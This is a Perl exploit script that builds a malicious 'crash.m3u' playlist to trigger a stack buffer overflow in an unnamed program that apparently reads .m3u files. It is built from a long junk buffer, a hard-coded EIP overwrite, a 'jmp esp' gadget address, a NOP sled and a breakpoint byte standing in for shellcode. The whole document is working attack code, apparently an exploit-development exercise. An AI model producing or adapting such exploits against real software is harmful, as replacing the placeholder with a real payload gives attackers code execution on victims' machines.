#! /usr/bin/perl

my $file= "crash.m3u";

my $junk= "\x41" x 26072;


my $eip = pack('V',0x1002B6CA);
my $jmpesp = pack('V',0x760dd337);


my $prependesp = "XXXX";  #add 4 bytes so ESP points at beginning of shellcode >

my $shellcode = "\x90" x 8; #first break

$shellcode = $shellcode . $jmpesp;

$shellcode = $shellcode . "\xcc" . "\x90" x 500;


open($FILE,">$file");
print $FILE $junk.$eip.$prependesp.$shellcode;
close($FILE);
print "m3u File Created successfully\n";

